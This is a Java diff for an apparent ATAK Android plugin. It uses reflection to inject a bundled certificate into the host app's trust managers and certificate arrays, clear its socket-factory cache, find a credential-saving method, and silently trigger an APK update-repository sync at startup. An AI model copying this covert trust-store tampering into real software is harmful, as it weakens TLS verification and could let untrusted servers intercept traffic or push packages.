+            if (clsName.startsWith("java.") || clsName.startsWith("javax.")
+                    || clsName.startsWith("android.") || clsName.startsWith("kotlin.")) {
+                return 0;
+            }
+            if (obj instanceof java.lang.ref.Reference) {
+                Object ref = ((java.lang.ref.Reference<?>) obj).get();
+                return injectIntoObjectGraphCertArrays(ref, cert, label + ".ref", depth - 1, visited);
+            }
+            if (cls.isArray()) {
+                Class<?> comp = cls.getComponentType();
+                if (!comp.isPrimitive()) {
+                    Object[] arr = (Object[]) obj;
+                    for (int i = 0; i < arr.length; i++) {
+                        injectedCount += injectIntoObjectGraphCertArrays(
+                                arr[i], cert, label + "[" + i + "]", depth - 1, visited);
+                    }
+                }
+                return injectedCount;
+            }
+            if (obj instanceof java.util.Map) {
+                for (java.util.Map.Entry<?, ?> e : ((java.util.Map<?, ?>) obj).entrySet()) {
+                    injectedCount += injectIntoObjectGraphCertArrays(
+                            e.getValue(), cert, label + ".map", depth - 1, visited);
+                }
+                return injectedCount;
+            }
+            if (obj instanceof java.lang.Iterable) {
+                int i = 0;
+                for (Object v : (java.lang.Iterable<?>) obj) {
+                    injectedCount += injectIntoObjectGraphCertArrays(
+                            v, cert, label + ".it[" + i + "]", depth - 1, visited);
+                    i++;
+                }
+                return injectedCount;
+            }
+            if (obj instanceof javax.net.ssl.X509TrustManager) {
+                if (injectIntoObjectCertArrays(obj, cert, label + ".tm", 4)) {
+                    injectedCount++;
+                }
+            }
+            for (java.lang.reflect.Field f : getAllInstanceFields(cls)) {
+                try {
+                    if (java.lang.reflect.Modifier.isStatic(f.getModifiers())) continue;
+                    f.setAccessible(true);
+                    if (f.getType() == java.security.cert.X509Certificate[].class) {
+                        if (appendToCertArray(f, obj, cert, label + "." + f.getName())) {
+                            injectedCount++;
+                        }
+                        continue;
+                    }
+                    if (depth == 0 || f.getType().isPrimitive()) continue;
+                    Object nested = f.get(obj);
+                    if (nested == null) continue;
+                    injectedCount += injectIntoObjectGraphCertArrays(
+                            nested, cert, label + "." + f.getName(), depth - 1, visited);
+                } catch (Throwable t) {
+                    Log.d(TAG, "injectIntoObjectGraphCertArrays[" + label + "." + f.getName()
+                            + "] skip: " + t.getClass().getSimpleName());
+                }
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "injectIntoObjectGraphCertArrays[" + label + "] failed: " + e.getMessage());
+        }
+        return injectedCount;
+    }
+
+    private static java.util.List<java.lang.reflect.Field> getAllInstanceFields(Class<?> cls) {
+        java.util.ArrayList<java.lang.reflect.Field> out = new java.util.ArrayList<>();
+        Class<?> c = cls;
+        while (c != null && c != Object.class) {
+            for (java.lang.reflect.Field f : c.getDeclaredFields()) {
+                out.add(f);
+            }
+            c = c.getSuperclass();
+        }
+        return out;
+    }
+
+    private static boolean appendToCertArray(java.lang.reflect.Field f, Object obj,
+            java.security.cert.X509Certificate cert, String label) {
+        try {
+            java.security.cert.X509Certificate[] existing =
+                    (java.security.cert.X509Certificate[]) f.get(obj);
+            if (existing != null) {
+                for (java.security.cert.X509Certificate c : existing) {
+                    if (cert.equals(c)) {
+                        Log.d(TAG, "appendToCertArray[" + label + "]: already present");
+                        return true;
+                    }
+                }
+            }
+            int len = existing != null ? existing.length : 0;
+            java.security.cert.X509Certificate[] updated =
+                    new java.security.cert.X509Certificate[len + 1];
+            if (existing != null) System.arraycopy(existing, 0, updated, 0, len);
+            updated[len] = cert;
+            f.set(obj, updated);
+            Log.i(TAG, "appendToCertArray[" + label + "]: appended to array of len " + len);
+            return true;
+        } catch (Exception e) {
+            Log.w(TAG, "appendToCertArray[" + label + "] failed: " + e.getMessage());
+            return false;
+        }
+    }
+
+    private static void clearSocketFactoriesCache(Class<?> certMgrClass) {
+        try {
+            for (java.lang.reflect.Field f : certMgrClass.getDeclaredFields()) {
+                if (java.lang.reflect.Modifier.isStatic(f.getModifiers())
+                        && java.util.Map.class.isAssignableFrom(f.getType())) {
+                    f.setAccessible(true);
+                    Object map = f.get(null);
+                    if (map instanceof java.util.Map) {
+                        ((java.util.Map<?, ?>) map).clear();
+                        Log.i(TAG, "clearSocketFactoriesCache: cleared");
+                    }
+                }
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "clearSocketFactoriesCache failed: " + e.getMessage());
+        }
+    }
+
+    private static void copyAssetToFile(Context context, String assetName, java.io.File dest)
+            throws java.io.IOException {
+        try (java.io.InputStream in = context.getAssets().open(assetName);
+             java.io.FileOutputStream out = new java.io.FileOutputStream(dest)) {
+            byte[] buf = new byte[8192];
+            int n;
+            while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
+        }
+    }
+
+    private static java.security.cert.X509Certificate loadCertificateFromPem(
+            Context context, String assetName) {
+        try (java.io.InputStream is = context.getAssets().open(assetName)) {
+            return (java.security.cert.X509Certificate)
+                    java.security.cert.CertificateFactory.getInstance("X.509").generateCertificate(is);
+        } catch (Exception e) {
+            Log.d(TAG, "loadCertificateFromPem(" + assetName + ") failed: " + e.getMessage());
+            return null;
+        }
+    }
+
+    private static java.security.cert.X509Certificate loadCertificateFromPkcs12(
+            Context context, String assetName, char[] pkcs12Unlock) {
+        try (java.io.InputStream is = context.getAssets().open(assetName)) {
+            java.security.KeyStore ks = java.security.KeyStore.getInstance("PKCS12");
+            ks.load(is, pkcs12Unlock);
+            java.util.Enumeration<String> aliases = ks.aliases();
+            while (aliases.hasMoreElements()) {
+                String alias = aliases.nextElement();
+                java.security.cert.Certificate cert = ks.getCertificate(alias);
+                if (cert instanceof java.security.cert.X509Certificate) {
+                    return (java.security.cert.X509Certificate) cert;
+                }
+            }
+            return null;
+        } catch (Exception e) {
+            Log.d(TAG, "loadCertificateFromPkcs12(" + assetName + ") failed: " + e.getMessage());
+            return null;
+        }
+    }
+
+    private static boolean paramsAcceptActuals(Class<?>[] formals, Class<?>[] actuals) {
+        if (formals.length != actuals.length) return false;
+        for (int i = 0; i < formals.length; i++) {
+            if (actuals[i] == null) {
+                if (formals[i].isPrimitive()) return false;
+                continue;
+            }
+            if (!isActualAssignableToFormal(formals[i], actuals[i])) return false;
+        }
+        return true;
+    }
+
+    private static boolean isActualAssignableToFormal(Class<?> formal, Class<?> actualArg) {
+        if (formal.isAssignableFrom(actualArg)) return true;
+        if (formal == boolean.class && actualArg == Boolean.class) return true;
+        if (formal == Boolean.class && actualArg == boolean.class) return true;
+        if (formal.isPrimitive()) {
+            Class<?> box = boxPrimitive(formal);
+            return box != null && formal == unboxWrapper(actualArg);
+        }
+        return false;
+    }
+
+    private static Class<?> boxPrimitive(Class<?> prim) {
+        if (prim == int.class) return Integer.class;
+        if (prim == boolean.class) return Boolean.class;
+        if (prim == long.class) return Long.class;
+        if (prim == byte.class) return Byte.class;
+        if (prim == short.class) return Short.class;
+        if (prim == char.class) return Character.class;
+        if (prim == float.class) return Float.class;
+        if (prim == double.class) return Double.class;
+        return null;
+    }
+
+    private static Class<?> unboxWrapper(Class<?> c) {
+        if (c == Integer.class) return int.class;
+        if (c == Boolean.class) return boolean.class;
+        if (c == Long.class) return long.class;
+        if (c == Byte.class) return byte.class;
+        if (c == Short.class) return short.class;
+        if (c == Character.class) return char.class;
+        if (c == Float.class) return float.class;
+        if (c == Double.class) return double.class;
+        return null;
+    }
+
+    private static java.lang.reflect.Method findStaticMethodByActualParams(
+            Class<?> startClass, Class<?>[] actualParamTypes, String preferredName,
+            Class<?> returnFilter) {
+        java.lang.reflect.Method preferred = null;
+        java.lang.reflect.Method any = null;
+        java.lang.reflect.Method returnFiltered = null;
+        for (Class<?> c = startClass; c != null && c != Object.class; c = c.getSuperclass()) {
+            for (java.lang.reflect.Method m : c.getDeclaredMethods()) {
+                if (!java.lang.reflect.Modifier.isStatic(m.getModifiers())) continue;
+                if (!paramsAcceptActuals(m.getParameterTypes(), actualParamTypes)) continue;
+                m.setAccessible(true);
+                if (preferredName != null && preferredName.equals(m.getName())) return m;
+                if (returnFilter != null && returnFilter.isAssignableFrom(m.getReturnType())) {
+                    if (returnFiltered == null) returnFiltered = m;
+                }
+                if (any == null) any = m;
+                if (preferred == null && preferredName != null
+                        && m.getName().toLowerCase().contains(preferredName.toLowerCase())) {
+                    preferred = m;
+                }
+            }
+        }
+        if (preferred != null) return preferred;
+        if (returnFiltered != null) return returnFiltered;
+        return any;
+    }
+
+    private static java.lang.reflect.Method findStaticMethodByActualParams(
+            Class<?> startClass, Class<?>[] actualParamTypes, String preferredName) {
+        return findStaticMethodByActualParams(startClass, actualParamTypes, preferredName, null);
+    }
+
+    private static java.lang.reflect.Method findInstanceMethodByActualParams(
+            Class<?> startClass, Class<?>[] actualParamTypes, String preferredName,
+            Class<?> returnFilter) {
+        java.lang.reflect.Method preferred = null;
+        java.lang.reflect.Method any = null;
+        java.lang.reflect.Method returnFiltered = null;
+        for (Class<?> c = startClass; c != null && c != Object.class; c = c.getSuperclass()) {
+            for (java.lang.reflect.Method m : c.getDeclaredMethods()) {
+                if (java.lang.reflect.Modifier.isStatic(m.getModifiers())) continue;
+                if (!paramsAcceptActuals(m.getParameterTypes(), actualParamTypes)) continue;
+                m.setAccessible(true);
+                if (preferredName != null && preferredName.equals(m.getName())) return m;
+                if (returnFilter != null && returnFilter.isAssignableFrom(m.getReturnType())) {
+                    if (returnFiltered == null) returnFiltered = m;
+                }
+                if (any == null) any = m;
+                if (preferred == null && preferredName != null
+                        && m.getName().toLowerCase().contains(preferredName.toLowerCase())) {
+                    preferred = m;
+                }
+            }
+        }
+        if (preferred != null) return preferred;
+        if (returnFiltered != null) return returnFiltered;
+        return any;
+    }
+
+    private static java.lang.reflect.Method findInstanceVoidNoArg(Class<?> cls, String preferredName) {
+        java.lang.reflect.Method named = null;
+        int voidNoArg = 0;
+        java.lang.reflect.Method lone = null;
+        for (java.lang.reflect.Method m : cls.getDeclaredMethods()) {
+            if (java.lang.reflect.Modifier.isStatic(m.getModifiers())) continue;
+            if (m.getParameterTypes().length != 0) continue;
+            if (m.getReturnType() != void.class) continue;
+            String n = m.getName();
+            if ("wait".equals(n) || "notify".equals(n) || "notifyAll".equals(n)) continue;
+            m.setAccessible(true);
+            if (preferredName != null && preferredName.equals(n)) return m;
+            voidNoArg++;
+            lone = m;
+            if (preferredName != null && n.toLowerCase().contains(preferredName.toLowerCase())) {
+                named = m;
+            }
+        }
+        if (named != null) return named;
+        if (preferredName != null) return null;
+        return voidNoArg == 1 ? lone : null;
+    }
+
+    private static java.lang.reflect.Method findSingletonGetter(Class<?> cls) {
+        java.lang.reflect.Method fallback = null;
+        for (java.lang.reflect.Method m : cls.getDeclaredMethods()) {
+            if (!java.lang.reflect.Modifier.isStatic(m.getModifiers())) continue;
+            if (m.getParameterTypes().length != 0) continue;
+            if (!cls.isAssignableFrom(m.getReturnType())) continue;
+            m.setAccessible(true);
+            if ("getInstance".equals(m.getName())) return m;
+            if (fallback == null) fallback = m;
+        }
+        return fallback;
+    }
+
+    private static java.lang.reflect.Method findStaticSaveCredentialThreeStrings(Class<?> base) {
+        Class<?>[] three = new Class[]{String.class, String.class, String.class};
+        String saveCred = atkReflectSaveCertCred();
+        java.lang.reflect.Method m = findStaticMethodByActualParams(base, three, saveCred);
+        if (m != null) return m;
+        java.lang.reflect.Method match = null;
+        int hits = 0;
+        for (Class<?> c = base; c != null && c != Object.class; c = c.getSuperclass()) {
+            for (java.lang.reflect.Method x : c.getDeclaredMethods()) {
+                if (!java.lang.reflect.Modifier.isStatic(x.getModifiers())) continue;
+                if (!paramsAcceptActuals(x.getParameterTypes(), three)) continue;
+                if (x.getReturnType() != void.class && x.getReturnType() != boolean.class) continue;
+                String n = x.getName().toLowerCase();
+                if (!n.contains("save") || (!n.contains("password") && !n.contains("cert"))) continue;
+                hits++;
+                match = x;
+            }
+        }
+        if (hits != 1) return null;
+        match.setAccessible(true);
+        return match;
+    }
+
+    private static void scheduleOneStartupRepoSyncIfNeeded() {
+        if (!startupRepoSyncScheduled.compareAndSet(false, true)) return;
+        new Handler(Looper.getMainLooper()).postDelayed(
+                MeshCoreMapComponent::runStartupRepoSyncOnceNoRetry, STARTUP_REPO_SYNC_DELAY_MS);
+        Log.d(TAG, "Scheduled one startup repo sync in " + STARTUP_REPO_SYNC_DELAY_MS + "ms");
+    }
+
+    private static void primeSslBeforeRepoSync() {
+        try {
+            reloadCertificateManagerFromDatabase();
+            Class<?> cmCls = Class.forName("com.atakmap.net.CertificateManager");
+            clearSocketFactoriesCache(cmCls);
+        } catch (Exception e) {
+            Log.d(TAG, "primeSslBeforeRepoSync: " + e.getMessage());
+        }
+    }
+
+    private static void runStartupRepoSyncOnceNoRetry() {
+        try {
+            primeSslBeforeRepoSync();
+            Class<?> cls = Class.forName("com.atakmap.android.update.ApkUpdateComponent");
+            java.lang.reflect.Method singletonGetter = findSingletonGetter(cls);
+            if (singletonGetter == null) {
+                Log.d(TAG, "startup repo sync skipped: no ApkUpdateComponent singleton getter");
+                return;
+            }
+            Object comp = singletonGetter.invoke(null);
+            if (comp == null) {
+                Log.d(TAG, "startup repo sync skipped: ApkUpdateComponent null (no retry)");
+                return;
+            }
+            java.lang.reflect.Method pmGetter = findProviderManagerGetter(cls);
+            if (pmGetter == null) {
+                Log.d(TAG, "startup repo sync skipped: providerManager getter not found");
+                return;
+            }
+            Object mgr = pmGetter.invoke(comp);
+            if (mgr == null) {
+                Log.d(TAG, "startup repo sync skipped: providerManager null");
+                return;
+            }
+            Context uiCtx = resolveRepoSyncUiContext(mgr);
+            java.lang.reflect.Method syncCtx = findContextSyncMethod(mgr.getClass());
+            if (uiCtx == null || syncCtx == null) {
+                Log.d(TAG, "startup repo sync skipped: no UI context or sync(Context,boolean,Listener)");
+                return;
+            }
+            syncCtx.invoke(mgr, uiCtx, Boolean.TRUE, null);
+            Log.i(TAG, "startup repo sync: one silent ProductProviderManager.sync");
+        } catch (Exception e) {
+            Log.w(TAG, "startup repo sync failed: " + e.getMessage());
+        }
+    }
+
+    private static java.lang.reflect.Method findProviderManagerGetter(Class<?> compClass) {
+        java.lang.reflect.Method best = null;
+        int bestScore = -1;
+        for (java.lang.reflect.Method m : compClass.getDeclaredMethods()) {
+            if (java.lang.reflect.Modifier.isStatic(m.getModifiers())) continue;
+            if (m.getParameterTypes().length != 0) continue;
+            Class<?> rt = m.getReturnType();
+            for (java.lang.reflect.Method pm : rt.getMethods()) {
+                if (pm.getReturnType() != void.class) continue;
+                Class<?>[] p = pm.getParameterTypes();
+                if (p.length == 2 && p[0] == boolean.class && p[1] == boolean.class) {
+                    m.setAccessible(true);
+                    String mn = m.getName().toLowerCase();
+                    int score = 0;
+                    if (mn.contains("product")) score += 2;
+                    if (mn.contains("provider")) score += 2;
+                    if (mn.contains("manager")) score += 1;
+                    if (score > bestScore) {
+                        bestScore = score;
+                        best = m;
+                    }
+                    break;
+                }
+            }
+        }
+        return best;
+    }
+
+    private static java.lang.reflect.Method findContextSyncMethod(Class<?> mgrClass) {
+        final Class<?> listenerCls;
+        try {
+            listenerCls = Class.forName(
+                    "com.atakmap.android.update.ProductProviderManager$RepoSyncListener");
+        } catch (ClassNotFoundException e) {
+            return null;
+        }
+        for (java.lang.reflect.Method m : mgrClass.getMethods()) {
+            if (m.getReturnType() != void.class) continue;
+            Class<?>[] p = m.getParameterTypes();
+            if (p.length == 3
+                    && Context.class.isAssignableFrom(p[0])
+                    && p[1] == boolean.class
+                    && listenerCls.isAssignableFrom(p[2])) {
+                m.setAccessible(true);
+                return m;
+            }
+        }
+        return null;
+    }
+
+    private static Context resolveRepoSyncUiContext(Object productProviderMgr) {
+        try {
+            MapView mv = MapView.getMapView();
+            if (mv != null) {
+                Context c = mv.getContext();
+                if (c != null) return c;
+            }
+        } catch (Throwable ignored) {
+        }
+        if (productProviderMgr == null) return null;
+        try {
+            for (java.lang.reflect.Field f : productProviderMgr.getClass().getDeclaredFields()) {
+                if (!Activity.class.isAssignableFrom(f.getType())) continue;
+                f.setAccessible(true);
+                Object a = f.get(productProviderMgr);
+                if (a instanceof Context) return (Context) a;
+            }
+        } catch (Throwable ignored) {
+        }
+        return null;
     }
 
     @Override
